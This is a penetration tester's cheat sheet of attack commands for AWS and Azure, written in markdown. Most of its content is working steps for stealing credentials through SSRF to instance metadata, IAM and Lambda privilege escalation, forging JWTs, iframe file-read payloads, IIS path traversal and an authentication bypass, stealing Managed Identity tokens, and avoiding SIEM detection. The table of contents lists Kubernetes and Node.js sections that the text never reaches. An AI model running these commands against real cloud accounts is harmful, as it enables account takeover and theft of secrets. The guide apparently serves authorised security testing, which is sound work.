# Cloud Pentest Process

---

## Table of Contents

**[AWS](#aws)**
- [Credentials & Setup](#credentials--setup) — [Configure profile](#configure-profile) · [Credential precedence](#credential-precedence-highest-to-lowest) · [Temporary credentials](#temporary-credentials--all-three-required)
- [Enumeration](#enumeration) — [Who am I?](#who-am-i) · [Find credentials on host](#find-credentials-on-a-compromised-host) · [Service sweep](#quick-service-sweep--find-whats-accessible) · [Multi-region sweep](#multi-region-sweep)
- [S3](#s3)
- [EC2](#ec2) — [User Data](#user-data--credential-leak) · [IMDS](#imds--instance-metadata-service) · [SSRF → IMDS](#ssrf--imds) · [Instance Profile Abuse](#instance-profile-abuse-privesc)
- [Lambda](#lambda) — [JWT forge](#jwt-forge-after-finding-secret-in-lambda-env-vars-or-source) · [PrivEsc via PassRole](#privesc-via-lambda-passrole)
- [SNS](#sns--simple-notification-service) · [API Gateway](#api-gateway--using-a-leaked-api-key)
- [SQS](#sqs--simple-queue-service)
- [Elastic Beanstalk](#elastic-beanstalk)
- [CloudWatch](#cloudwatch)
- [IAM](#iam) — [Enumeration Playbook](#enumeration-playbook) · [PrivEsc table](#privilege-escalation--quick-reference) · [Policy Version Rollback](#privesc--policy-version-rollback) · [Tag+CreateAccessKey](#privesc--tag--createaccesskey) · [MFA Role](#privesc--mfa-required-role)
- [Secrets Manager](#secrets-manager)
- [STS](#sts--temporary-credentials)
- [DynamoDB](#dynamodb)
- [IAM Role Chaining](#iam-role-chaining)

**[Azure](#azure)**
- [AWS → Azure Mapping](#aws--azure-mapping)
- [Credentials & Setup](#credentials--setup-1) — [Login](#login) · [ROPC token](#get-graph-api-token-via-ropc-when-az-cli-session-wont-switch-accounts) · [Token scopes](#check-token-scopes-what-the-account-can-do) · [Credential precedence](#credential-precedence)
- [Enumeration](#enumeration-2)
- [SIEM Evasion](#siem-evasion--low-noise-enumeration)
- [Azure AD (Entra ID)](#azure-ad-entra-id)
- [RBAC](#rbac)
- [Azure Blob Storage](#azure-blob-storage)
- [Key Vault](#key-vault)
- [App Service](#app-service) — [Path Traversal](#path-traversal--file-inclusion) · [Kudu SCM](#kudu-scm-endpoint)
- [Managed Identity + IMDS](#managed-identity--imds) — [App Service IDENTITY_ENDPOINT](#app-service-kudu--identity_endpoint-approach) · [VM IMDS](#vm--general-azure-resource--imds-approach) · [AzureHound](#azurehound-with-managed-identity-token)
- [Azure AD Roles — What's Dangerous](#azure-ad-roles--whats-dangerous-whats-not)
- [BloodHound (Azure AD)](#bloodhound-azure-ad)
- [Azure Blob Storage — Pentest Methodology](#azure-blob-storage--pentest-methodology)
- [Azure Table Storage](#azure-table-storage)
- [Azure Function App](#azure-function-app) — [SQL Injection](#sql-injection--testing-methodology) · [Time-based blind SQLi](#time-based-blind-sqli--data-exfiltration-mssql)

**[Kubernetes / EKS](#kubernetes--eks)**
- [Setup — Variables Inside a Pod](#setup--variables-inside-a-pod)
- [Kubernetes — Enumeration](#kubernetes--enumeration)
- [Kubernetes — RBAC Enumeration](#kubernetes--rbac-enumeration)
- [Kubernetes — CronJobs](#kubernetes--cronjobs)
- [EKS — IMDS from Inside a Pod](#eks--imds-from-inside-a-pod)
- [EKS — SSM Session on EC2 Node](#eks--ssm-session-on-ec2-node)
- [EKS — containerd: Exec into Any Container](#eks--containerd-exec-into-any-container-on-the-node)
- [EKS — IRSA via kubectl exec](#eks--irsa-via-kubectl-exec-into-another-pod)
- [EKS — RBAC Cross-Namespace Enumeration](#eks--rbac-cross-namespace-enumeration-kubectl)
- [kubectl — Pentest Playbook](#kubectl--pentest-playbook)
- [PostgreSQL — Connect via Unix Socket](#postgresql--connect-via-unix-socket)

**Web / Node.js Attacks**
- [IDOR — Insecure Direct Object Reference](#idor--insecure-direct-object-reference)
- [SSTI / SSJI — Node.js Template Injection → RCE](#ssti--ssji--nodejs-template-injection--rce)
- [Prototype Pollution (Node.js)](#prototype-pollution-nodejs) — [EJS RCE](#ejs-rce-via-polluted-outputfunctionname) · [Reverse shell](#reverse-shell--use-exec-not-execsync)

---

# AWS

## Credentials & Setup

### Configure profile
```bash
aws configure --profile <name>
# Enter: Access Key ID, Secret Access Key, region (us-east-1), output (json)
```

### Credential precedence (highest to lowest)
1. Environment variables (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`)
2. `--profile` flag
3. Default profile in `~/.aws/credentials`

> Env vars override `--profile` entirely. Always `unset` before switching back to a profile.

```bash
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
```

### Temporary credentials — all three required
```bash
export AWS_ACCESS_KEY_ID=<key>
export AWS_SECRET_ACCESS_KEY=<secret>
export AWS_SESSION_TOKEN=<token>
```

---

## Enumeration

### Who am I?
```bash
aws sts get-caller-identity --profile <profile>
```
> Always run first. Returns Account ID, User ARN, UserID. Username is needed for all subsequent IAM commands.

### Find credentials on a compromised host
```bash
cat ~/.aws/credentials
cat ~/.aws/config
env | grep -iE 'aws|key|secret|token'
```

### Find region
```bash
# From config file
cat ~/.aws/config

# From IMDS (inside EC2)
curl http://169.254.169.254/latest/meta-data/placement/region
```

### Quick service sweep — find what's accessible
```bash
aws s3 ls --profile <profile>
aws ec2 describe-instances --region us-east-1 --profile <profile>
aws lambda list-functions --region us-east-1 --profile <profile>
aws sqs list-queues --region us-east-1 --profile <profile>
aws sns list-topics --region us-east-1 --profile <profile>
aws secretsmanager list-secrets --region us-east-1 --profile <profile>
aws elasticbeanstalk describe-applications --profile <profile>
```
> 403 = wrong/missing credentials. AccessDenied = wrong permissions. Empty response = service exists but nothing there.

### Multi-region sweep
```bash
for r in us-east-1 us-west-2 eu-west-1 ap-southeast-1; do
  echo "=== $r ==="
  aws secretsmanager list-secrets --region $r --profile <profile> 2>/dev/null
done
```
> Secrets Manager, Lambda, EC2 are regional. If nothing in us-east-1, try other regions.

---

## S3

Object storage. Buckets can be misconfigured to allow public read/write. Bucket names are often hardcoded in site HTML/JS source.

```bash
# List all buckets (authenticated)
aws s3 ls --profile <profile>

# List bucket contents
aws s3 ls s3://<bucket> --recursive --profile <profile>

# Download all files
aws s3 cp s3://<bucket> . --recursive --profile <profile>

# Try anonymous access (public bucket)
aws s3 ls s3://<bucket> --no-sign-request

# Upload file
aws s3 cp <file> s3://<bucket>/<path> --profile <profile>
```

> `--no-sign-request` = unauthenticated request. Works only on public buckets. If app syncs S3 to web server — upload webshell, try `.php5` / `.phtml` if `.php` is blocked.

---

## EC2

### Enumeration
```bash
# Find all instances — look for PublicIpAddress and InstanceId
aws ec2 describe-instances --region us-east-1 --profile <profile>

# Check instance profile (IAM role attached to EC2)
aws ec2 describe-iam-instance-profile-associations --region us-east-1 --profile <profile>
```

### User Data — credential leak
EC2 User Data is a startup script that runs at boot. Admins often hardcode credentials here.

```bash
# Read User Data (returns base64)
aws ec2 describe-instance-attribute \
  --instance-id <id> \
  --attribute userData \
  --region us-east-1 \
  --profile <profile>

# Decode
echo "<base64>" | base64 -d

# From inside EC2
curl http://169.254.169.254/latest/user-data
```

### IMDS — Instance Metadata Service
Available only from inside EC2 at `169.254.169.254`. Returns temporary IAM role credentials.

```bash
# Check if IAM role is attached
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get role credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```
> Returns `AccessKeyId` + `SecretAccessKey` + `Token`. Export all three and use from attacker machine. Identity will show `assumed-role/<role-name>/<instance-id>`.

### SSRF → IMDS
SSRF tricks the server into making requests to internal addresses. EC2 reaches IMDS on your behalf.

**Vector 1 — URL fetch parameter:**
```bash
http://<target>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://<target>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```

**Vector 2 — Misconfigured reverse proxy:**
If nginx/HAProxy forwards requests without restricting internal IPs:
```bash
# Via Host header
curl http://<proxy-ip>/latest/meta-data/iam/security-credentials/ \
  -H "Host: 169.254.169.254"

# Via path (location-based routing)
curl http://<proxy-ip>/latest/meta-data/iam/security-credentials/
```
> The proxy runs on EC2 — it reaches IMDS as the instance itself.

### Instance Profile Abuse (PrivEsc)
If you have `ec2:RunInstances` + `iam:PassRole` — launch EC2 with a high-privilege role and read its IMDS credentials.

```bash
# List existing instance profiles
aws iam list-instance-profiles --profile <profile>

# Create new instance profile
aws iam create-instance-profile --instance-profile-name <name> --profile <profile>

# Add role to instance profile
aws iam add-role-to-instance-profile \
  --instance-profile-name <name> \
  --role-name <target-role> \
  --profile <profile>

# Launch EC2 with the instance profile (PassRole)
aws ec2 run-instances \
  --image-id <ami-id> \
  --instance-type t2.micro \
  --iam-instance-profile Name=<profile-name> \
  --region us-east-1 \
  --profile <profile>

# Execute command via SSM (no SSH needed)
aws ssm send-command \
  --instance-ids <id> \
  --document-name "AWS-RunShellScript" \
  --parameters commands=["curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"] \
  --region us-east-1
```

---

## Lambda

Serverless compute. Functions execute with an attached IAM role. Secrets are commonly stored in environment variables or hardcoded in function code.

```bash
# List functions
aws lambda list-functions --region us-east-1 --profile <profile>

# Get function details + download URL for source code
aws lambda get-function --function-name <name> --region us-east-1 --profile <profile>

# Get environment variables
aws lambda get-function-configuration --function-name <name> --region us-east-1 --profile <profile>
# Look for "Environment": {"Variables": {...}}
```

> `get-function` returns `Code.Location` — a presigned URL to download the zip. Unzip and read the code for hardcoded secrets, API keys, DB passwords.

### Download and inspect function source
```bash
# get-function returns Code.Location — download the zip
url=$(aws lambda get-function --function-name <name> --region us-east-1 --profile <profile> | python3 -c "import sys,json; print(json.load(sys.stdin)['Code']['Location'])")
wget "$url" -O /tmp/lambda.zip
cd /tmp && unzip lambda.zip
```

### JWT forge (after finding secret in Lambda env vars or source)
If app uses JWT for auth and you found the signing secret:
```bash
python3 -c "import jwt; print(jwt.encode({'username': 'admin', 'role': 'admin'}, '<secret>', algorithm='HS256'))"
```
> Set the token as cookie or `Authorization: Bearer <token>` header. Algorithm is usually HS256 — check source code to confirm.

### PrivEsc via Lambda PassRole
`iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction` = full privilege escalation.

```bash
# 1. Create payload — executes as the target role
cat > /tmp/lambda_function.py << 'EOF'
import boto3, json

def lambda_handler(event, context):
    sm = boto3.client('secretsmanager', region_name='us-east-1')
    s3 = boto3.client('s3')
    sts = boto3.client('sts')
    return {
        'identity': sts.get_caller_identity(),
        'secrets': sm.list_secrets().get('SecretList', []),
        's3': [b['Name'] for b in s3.list_buckets().get('Buckets', [])]
    }
EOF

# 2. Zip — -j strips directory paths (critical)
cd /tmp && zip -j lambda_function.zip lambda_function.py

# 3. Create Lambda with high-privilege role
aws lambda create-function \
  --function-name <name> \
  --runtime python3.12 \
  --role <target-role-arn> \
  --handler lambda_function.lambda_handler \
  --zip-file fileb:///tmp/lambda_function.zip \
  --region us-east-1

# 4. Invoke
aws lambda invoke --function-name <name> --region us-east-1 /tmp/out.json && cat /tmp/out.json

# 5. Update code if needed
cd /tmp && zip -j lambda_function.zip lambda_function.py
aws lambda update-function-code \
  --function-name <name> \
  --zip-file fileb:///tmp/lambda_function.zip \
  --region us-east-1
```

---

## SNS — Simple Notification Service

Pub/sub messaging. Topic = channel, Publisher = sender, Subscriber = receiver. If `sns:Subscribe` is open — anyone can subscribe and receive all messages, including leaked credentials.

```bash
# List topics
aws sns list-topics --region us-east-1 --profile <profile>

# Subscribe via email — messages delivered to inbox
aws sns subscribe \
  --topic-arn <arn> \
  --protocol email \
  --notification-endpoint <your@email.com> \
  --region us-east-1 \
  --profile <profile>
```
> AWS sends a confirmation email — must click to activate before messages are delivered.

### API Gateway — using a leaked API key
```bash
# Find APIs
aws apigateway get-rest-apis --region us-east-1 --profile <profile>

# Find stages (prod/dev/v1) — part of the URL
aws apigateway get-stages --rest-api-id <id> --region us-east-1 --profile <profile>

# Find endpoints (/secret, /data, /admin)
aws apigateway get-resources --rest-api-id <id> --region us-east-1 --profile <profile>

# Call endpoint with API key
curl -H "x-api-key: <key>" \
  https://<api-id>.execute-api.us-east-1.amazonaws.com/<stage>/<resource>
```

---

## SQS — Simple Queue Service

Message queue. Producer sends, consumer (often Lambda) processes asynchronously. Web app validates before sending to queue — but if you have `sqs:SendMessage` directly, you bypass all validation.

```bash
# List queues
aws sqs list-queues --region us-east-1 --profile <profile>

# Get queue URL by name
aws sqs get-queue-url --queue-name <name> --region us-east-1

# Check queue attributes (ARN, policy, who can read/write)
aws sqs get-queue-attributes --queue-url <url> --attribute-names All --region us-east-1

# Read messages (requires sqs:ReceiveMessage)
aws sqs receive-message --queue-url <url> --region us-east-1

# Send crafted message — bypasses web app validation
aws sqs send-message \
  --queue-url <url> \
  --message-body '{"key": "value"}' \
  --region us-east-1
```

> Message format comes from web app or Lambda source code — find exposed source, read how it builds the message body, forge it with modified values.

---

## Elastic Beanstalk

PaaS — AWS manages EC2/load balancer/autoscaling. Environment variables are stored in config and commonly contain hardcoded credentials.

```bash
# List applications
aws elasticbeanstalk describe-applications --profile <profile>

# List environments
aws elasticbeanstalk describe-environments --profile <profile>

# Read environment variables — primary target
aws elasticbeanstalk describe-configuration-settings \
  --application-name <app> \
  --environment-name <env> \
  --profile <profile>
```
> Look for `EnvironmentVariables` under `aws:cloudformation:template:parameter` namespace. Common keys: `SECRET_KEY`, `ACCESS_KEY`, `API_KEY`, `PASSWORD`, `DB_PASSWORD`.

**Attack chain:**
```
Low-privilege IAM user
  → describe-configuration-settings → credentials in env vars
Secondary credentials (iam:CreateAccessKey on *)
  → iam list-users → find high-privilege user
  → iam create-access-key → new credentials
High-privilege credentials → Secrets Manager / S3 / RDS
```

---

## CloudWatch

Lambda and application logs. May contain credentials or sensitive data printed during execution.

```bash
# List log groups
aws logs describe-log-groups --region us-east-1 --profile <profile>

# List log streams in a group
aws logs describe-log-streams \
  --log-group-name /aws/lambda/<function-name> \
  --region us-east-1 --profile <profile>

# Read log events
aws logs get-log-events \
  --log-group-name /aws/lambda/<function-name> \
  --log-stream-name <stream-name> \
  --region us-east-1 --profile <profile>
```

---

## IAM

Controls every API call in AWS. Misconfigured IAM is the #1 attack vector.

**Key principle:** Everything is denied by default. Explicit `Allow` required. Explicit `Deny` always wins.

### Primitives

| Primitive | Description |
|---|---|
| User | Human identity with permanent Access Key + Secret Key |
| Role | Temporary identity assumed by EC2, Lambda, or humans |
| Group | Collection of users for easier policy management |
| Policy | JSON: Effect + Action + Resource |
| Permission Boundary | Hard ceiling — overrides any Allow |

**Policy types:**
- **Managed** — standalone, attachable to many. Has ARN and versions.
- **Inline** — embedded in user/role. Does not appear in managed policy lists.

### Attacker mindset
```
Who am I? → What can I do? → Can I become someone with more permissions?
```

### Enumeration Playbook

```bash
# Step 1 — identity
aws sts get-caller-identity --profile <profile>

# Step 2 — managed policies on user
aws iam list-attached-user-policies --user-name <user> --profile <profile>
aws iam get-policy --policy-arn <arn> --profile <profile>
aws iam get-policy-version --policy-arn <arn> --version-id <v> --profile <profile>

# Step 3 — inline policies on user
aws iam list-user-policies --user-name <user> --profile <profile>
aws iam get-user-policy --user-name <user> --policy-name <name> --profile <profile>

# Step 4 — group membership
aws iam list-groups-for-user --user-name <user> --profile <profile>
aws iam list-attached-group-policies --group-name <group> --profile <profile>
aws iam list-group-policies --group-name <group> --profile <profile>
aws iam get-group-policy --group-name <group> --policy-name <name> --profile <profile>

# Step 5 — assumable roles
aws iam list-roles --profile <profile>
# Look for AssumeRolePolicyDocument with Principal.AWS = your ARN
aws iam get-role --role-name <role> --profile <profile>
aws sts assume-role --role-arn <arn> --role-session-name pentest --profile <profile>

# Step 6 — role policies
aws iam list-attached-role-policies --role-name <role> --profile <profile>
aws iam list-role-policies --role-name <role> --profile <profile>
aws iam get-role-policy --role-name <role> --policy-name <name> --profile <profile>
```

### Hidden data locations
IAM metadata fields are rarely audited — check all of these:

| Field | Command |
|---|---|
| Policy `Description` | `aws iam get-policy --policy-arn <arn>` |
| Policy `Resource` field | `aws iam get-policy-version --policy-arn <arn> --version-id <v>` |
| Inline policy `Sid` | `aws iam get-user-policy --user-name <u> --policy-name <p>` |
| Group `Path` | `aws iam list-groups-for-user --user-name <u>` |
| Role `Tags` | `aws iam list-role-tags --role-name <r>` |
| User `Tags` | `aws iam list-user-tags --user-name <u>` |

### Privilege Escalation — quick reference

| Permission | Path |
|---|---|
| `iam:AttachUserPolicy` | Attach `AdministratorAccess` to yourself |
| `iam:CreatePolicyVersion` | Create new policy version with `Action: *` |
| `iam:SetDefaultPolicyVersion` | Roll back to old version with broader permissions |
| `iam:CreateAccessKey` | Create keys for another user |
| `iam:UpdateLoginProfile` | Set console password for another user |
| `iam:TagUser` + `iam:CreateAccessKey` (tag-conditioned) | Tag target to satisfy condition, then create keys |
| `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction` | Create Lambda with admin role, invoke to execute as that role |
| `iam:PassRole` + `ec2:RunInstances` | Launch EC2 with admin role, read IMDS credentials |

### Privesc — Policy Version Rollback
Managed policies store up to 5 versions. Old versions are never auto-deleted.

```bash
# Read all versions
for v in v1 v2 v3 v4 v5; do
  echo "=== $v ==="
  aws iam get-policy-version --policy-arn <arn> --version-id $v --profile <profile> 2>/dev/null
done

# Set old version as default
aws iam set-default-policy-version --policy-arn <arn> --version-id <v> --profile <profile>
```
> Look for versions with `"Action": "*"`. Changing the default only updates a pointer — minimal API footprint.

### Privesc — Tag + CreateAccessKey
When `iam:CreateAccessKey` has a tag condition and you have `iam:TagUser`:

```bash
aws iam tag-user --user-name <target> --tags Key=<key>,Value=<value> --profile <profile>
aws iam list-user-tags --user-name <target> --profile <profile>
aws iam list-access-keys --user-name <target> --profile <profile>
# If 2 keys exist — delete inactive one first
aws iam delete-access-key --user-name <target> --access-key-id <id> --profile <profile>
aws iam create-access-key --user-name <target> --profile <profile>
```

### Privesc — MFA-Required Role
When Trust Policy has `aws:MultiFactorAuthPresent: true`:

```bash
# Create virtual MFA device
aws iam create-virtual-mfa-device \
  --virtual-mfa-device-name <name> \
  --outfile /tmp/qr.png \
  --bootstrap-method QRCodePNG \
  --profile <profile>

xdg-open /tmp/qr.png  # scan with authenticator app

# Enable MFA (two consecutive TOTP codes required)
aws iam enable-mfa-device \
  --user-name <user> \
  --serial-number arn:aws:iam::<account>:mfa/<name> \
  --authentication-code1 <code1> \
  --authentication-code2 <code2> \
  --profile <profile>

# Get MFA-authenticated session token
aws sts get-session-token \
  --serial-number arn:aws:iam::<account>:mfa/<name> \
  --token-code <code> \
  --profile <profile>

export AWS_ACCESS_KEY_ID=<key>
export AWS_SECRET_ACCESS_KEY=<secret>
export AWS_SESSION_TOKEN=<token>

# Now assume the MFA-protected role
aws sts assume-role --role-arn <arn> --role-session-name pentest
```

---

## Secrets Manager

Primary target after gaining elevated access. Stores DB passwords, API keys, tokens.

```bash
# List secrets (try multiple regions)
aws secretsmanager list-secrets --region us-east-1 --profile <profile>

# Read secret value
aws secretsmanager get-secret-value --secret-id <name-or-arn> --region <region> --profile <profile>
```
> `list-secrets` returns metadata only — always follow with `get-secret-value`.

---

## STS — Temporary Credentials

```bash
# Assume role
aws sts assume-role \
  --role-arn arn:aws:iam::<account>:role/<role> \
  --role-session-name pentest \
  --profile <profile>

# Verify identity after assuming
aws sts get-caller-identity
```
> Always re-run `get-caller-identity` after assuming to confirm the switch worked.

---

## DynamoDB

NoSQL key-value database. Check if app reads from DynamoDB and passes data into system commands or renderers without sanitization.

```bash
# List tables
aws dynamodb list-tables --region us-east-1 --profile <profile>

# Dump all records from table
aws dynamodb scan --table-name <table> --region us-east-1 --profile <profile>

# Create table
aws dynamodb create-table \
  --table-name <table> \
  --attribute-definitions AttributeName=<key>,AttributeType=S \
  --key-schema AttributeName=<key>,KeyType=HASH \
  --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=10 \
  --region us-east-1 --profile <profile>

# Write item — inject malicious payload
aws dynamodb put-item \
  --table-name <table> \
  --item '{"<key>":{"S":"<value>"},"data":{"S":"<payload>"}}' \
  --region us-east-1 --profile <profile>
```

> If a service reads `data` from DynamoDB and passes it to a PDF renderer (wkhtmltopdf, pd4ml) — inject `<iframe src="file:///etc/passwd">` or `<iframe src="file:///root/.aws/credentials">` to read local files as the renderer's user.

**SSTI/XSS via DynamoDB:**
If app renders DynamoDB values in HTML without sanitization — inject `<script>` tags or template payloads depending on the framework.

---

# Azure

## AWS → Azure Mapping

| AWS | Azure |
|-----|-------|
| IAM Users / Roles | Azure AD (Entra ID) Users / Service Principals |
| IAM Policies | RBAC Role Assignments |
| EC2 | Virtual Machine / App Service |
| S3 | Blob Storage |
| Secrets Manager | Key Vault |
| VPC | VNet + NSG |
| Instance Metadata (169.254.169.254) | Instance Metadata (169.254.169.254) — same IP, different API |
| STS AssumeRole | Managed Identity token request |
| CloudTrail | Azure Monitor / Activity Log |

---

## Credentials & Setup

### Install az cli
```bash
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
```

### Login
```bash
az login                          # browser-based
az login --use-device-code        # device code flow (headless)
az login -u <user> -p '<pass>'    # username/password (ROPC)
az login -u <user> -p '<pass>' --allow-no-subscriptions  # account with no subscription access
```

> If password contains `!!` — bash history expansion will corrupt it. Use `set +H` before the command or escape: `\!\!`

### Get Graph API token via ROPC (when az cli session won't switch accounts)
```bash
set +H
curl -s -X POST "https://login.microsoftonline.com/<tenantId>/oauth2/v2.0/token" \
  -d "grant_type=password&client_id=1950a258-227b-4e31-a9cf-717495945fc2&username=<user>&password=<pass>&scope=https://graph.microsoft.com/.default"

# Extract token directly
TOKEN=$(curl -s -X POST "https://login.microsoftonline.com/<tenantId>/oauth2/v2.0/token" \
  -d "grant_type=password&client_id=1950a258-227b-4e31-a9cf-717495945fc2&username=<user>&password=<pass>&scope=https://graph.microsoft.com/.default" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
```
> `client_id=1950a258-227b-4e31-a9cf-717495945fc2` is the public Microsoft Azure PowerShell app ID — use it for ROPC flow without registering your own app.

> When an account has no subscription, `az cli` ignores it and keeps the previous session. Use ROPC curl flow instead to operate as that account via Graph API.

### Check token scopes (what the account can do)
Decode the JWT at jwt.io or:
```bash
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool | grep -E "scp|roles|wids"
```
- `scp` — delegated permissions granted to the token
- `wids` — directory role IDs assigned to the user
- `roles` — application permissions

### Configure & switch accounts
```bash
az account list --all             # list all logged-in accounts
az account set --subscription <id>
az account show                   # current context (= aws sts get-caller-identity)
```

### Credential precedence
1. Environment variables (`AZURE_CLIENT_ID`, `AZURE_CLIENT_SECRET`, `AZURE_TENANT_ID`)
2. `az login` session (`~/.azure/`)
3. Managed Identity (inside Azure VM/App Service)

---

## Enumeration

### Who am I?
```bash
az account show
az ad signed-in-user show         # current user details
```

### Tenant & subscription info
```bash
az account list --all
az account tenant list
```

---

## SIEM Evasion — Low-Noise Enumeration

In real engagements, Azure Monitor and Sentinel log all API calls. Read-only operations are low risk; write/modify operations trigger alerts.

### Low-noise (safe to run freely)
```
az webapp show
az webapp identity show
az webapp auth show
az role assignment list
az resource list
az ad user list / group list
az keyvault list
az storage account list
GET requests to Graph API
GET requests to management.azure.com
```

### High-noise (triggers SIEM — use carefully)
```
az webapp config appsettings list   ← secrets access, often alerted
az webapp config appsettings set    ← config change
az webapp restart                   ← service disruption
az role assignment create/delete    ← privilege change
az keyvault secret set/delete       ← secret modification
Any POST/PATCH/DELETE to Graph API  ← write operations
Password resets                     ← always alerted
New service principal creation      ← always alerted
```

> Rule: GET = read = low noise. POST/PATCH/PUT/DELETE = write = high noise. When in doubt, check with the client whether their SOC is monitoring before running write operations.

> `az webapp config appsettings list` is technically a read operation but accesses secrets — many SIEMs alert on it specifically. Always flag this to the client in the report.

---

## Azure AD (Entra ID)

Azure's identity layer. Equivalent to AWS IAM but also covers SSO, OAuth apps, B2B/B2C.

### Users
```bash
az ad user list --output table
az ad user show --id <upn-or-objectid>
```

### Groups
```bash
az ad group list --output table
az ad group member list --group <name-or-id>
```

### Service Principals (= AWS Roles for apps)
```bash
az ad sp list --all --output table
az ad sp show --id <appId-or-objectid>
```

### App Registrations
```bash
az ad app list --all --output table
az ad app show --id <appId>
```

---

## RBAC

Controls what Azure resources an identity can access. Roles are assigned at scope: Management Group > Subscription > Resource Group > Resource.

### Key built-in roles
| Role | Access |
|------|--------|
| Owner | Full access + manage permissions |
| Contributor | Full access, cannot manage permissions |
| Reader | Read-only |
| User Access Administrator | Manage permissions only |

### Enumeration
```bash
# Current user's role assignments
az role assignment list --assignee <upn-or-objectid> --output table

# All assignments in subscription
az role assignment list --all --output table

# Role definitions
az role definition list --output table
```

---

## Azure Blob Storage

Equivalent to S3. Containers can be misconfigured to allow anonymous/public access.

```bash
# List storage accounts
az storage account list --output table

# List containers in a storage account
az storage container list --account-name <account> --output table

# Anonymous access check (no auth)
curl https://<account>.blob.core.windows.net/<container>?restype=container&comp=list

# List blobs (authenticated)
az storage blob list --account-name <account> --container-name <container> --output table

# Download blob
az storage blob download \
  --account-name <account> \
  --container-name <container> \
  --name <blob-name> \
  --file /tmp/<local-name>
```

> Public container URL format: `https://<account>.blob.core.windows.net/<container>/<blob>`

---

## Key Vault

Stores secrets, keys, certificates. Equivalent to AWS Secrets Manager + KMS combined.

```bash
# List key vaults
az keyvault list --output table

# List secrets in vault
az keyvault secret list --vault-name <vault> --output table

# Read secret value
az keyvault secret show --vault-name <vault> --name <secret-name>

# List keys
az keyvault key list --vault-name <vault> --output table

# List certificates
az keyvault certificate list --vault-name <vault> --output table
```

> Access requires `Key Vault Secrets User` role or legacy access policy. If Managed Identity has this role — exploit via SSRF.

---

## App Service

PaaS web hosting. Equivalent to Elastic Beanstalk. Has a built-in management endpoint (Kudu/SCM).

### Enumeration
```bash
az webapp list --output table
az webapp config show --name <app> --resource-group <rg>

# Environment variables — primary secrets target
az webapp config appsettings list --name <app> --resource-group <rg>

# Connection strings
az webapp config connection-string list --name <app> --resource-group <rg>
```

### Path Traversal & File Inclusion

Azure App Service runs on IIS (Windows). Path traversal uses backslash `\` not forward slash `/`.

**EasyAuth bypass via path traversal:**
EasyAuth protects routes based on URL pattern matching. If a path like `/status/` is excluded from auth rules, traversal from it can bypass authentication entirely:
```
/                    → 401 (EasyAuth blocks)
/status/../          → 200 (traversal bypasses auth check)
```

**File inclusion via query parameter:**
If a parameter loads files from disk (e.g. `?status=latest` loads `status/latest.html`), it may be vulnerable to path traversal:
```bash
# Windows style — backslash required for IIS
?status=..\web.config
?status=..\..\appsettings.json
?status=..\admin\login.aspx.cs

# URL encoded backslash
?status=..%5cweb.config
```

**Why `.aspx.cs` exposes source code:**
- `login.aspx` — IIS executes it as compiled code → returns HTML
- `login.aspx.cs` — code-behind C# source file → IIS serves it as plain text
- Always try `.cs` extension on any `.aspx` file found — may contain hardcoded credentials, business logic, connection strings

**Depth enumeration — try multiple traversal levels:**
```bash
# One level up
?status=..\appsettings.json        # File not found = wrong level
# Two levels up
?status=..\..\appsettings.json     # 200 = correct level
# Three levels up
?status=..\..\..\appsettings.json
```

**High-value target files on IIS/.NET:**
```
web.config              → connection strings, API keys, auth config
appsettings.json        → .NET Core config, secrets
appsettings.Production.json
connectionstrings.config
*.aspx.cs               → C# source code, hardcoded credentials
*.aspx.vb               → VB.NET source code
Global.asax.cs          → application-level config
```

**500 error on traversal = file found but executed:**
If traversal returns 500 instead of file content — the app is trying to execute the file as code. Switch to non-executable file types: `.json`, `.config`, `.cs`, `.txt`

---

### Kudu SCM endpoint
Built-in management console at `https://<app>.scm.azurewebsites.net`
```bash
# File system browser
https://<app>.scm.azurewebsites.net/api/vfs/

# Process list
https://<app>.scm.azurewebsites.net/api/processes/

# Debug console (RCE if accessible)
https://<app>.scm.azurewebsites.net/DebugConsole
```

---

## Managed Identity + IMDS

Managed Identity = AWS EC2 Instance Profile. App Service/VM gets an identity without storing credentials. Two environments — two different endpoints.

### How to detect Managed Identity
```bash
# Via az cli
az webapp identity show --name <app> --resource-group <rg>

# Via Kudu environment page
# Navigate to https://<app>.scm.azurewebsites.net → Environment → search IDENTITY_
# Presence of IDENTITY_ENDPOINT and IDENTITY_HEADER = Managed Identity assigned
```

### App Service (Kudu) — IDENTITY_ENDPOINT approach
App Service does NOT use `169.254.169.254`. It uses two environment variables available only inside the instance:
- `IDENTITY_ENDPOINT` — URL to request token from
- `IDENTITY_HEADER` — secret header value (CSRF protection)

```powershell
# From Kudu Debug Console → PowerShell
$resource = "https://management.azure.com/"
$url = "$($env:IDENTITY_ENDPOINT)?api-version=2019-08-01&resource=$resource"
$response = Invoke-RestMethod -Method Get -Uri $url -Headers @{ 'X-Identity-Header' = $env:IDENTITY_HEADER }
$response.access_token
```

```bash
# From Kudu bash console
curl -s "$IDENTITY_ENDPOINT?api-version=2019-08-01&resource=https://management.azure.com/" \
  -H "X-Identity-Header: $IDENTITY_HEADER"
```

> Tokens issued here are valid for ~90 minutes. Request a new one after expiry — re-run the same command. Variables are ONLY available inside the App Service instance, not from your attacker machine.

### VM / General Azure resource — IMDS approach
```bash
# Standard IMDS — works on Azure VMs
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### Use token to call Azure APIs
```bash
TOKEN="<access_token>"

# Enumerate accessible resources
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/<subId>/resources?api-version=2021-04-01" \
  | python3 -m json.tool

# List Key Vault secrets
curl -H "Authorization: Bearer $TOKEN" \
  "https://<vault>.vault.azure.net/secrets?api-version=7.4"

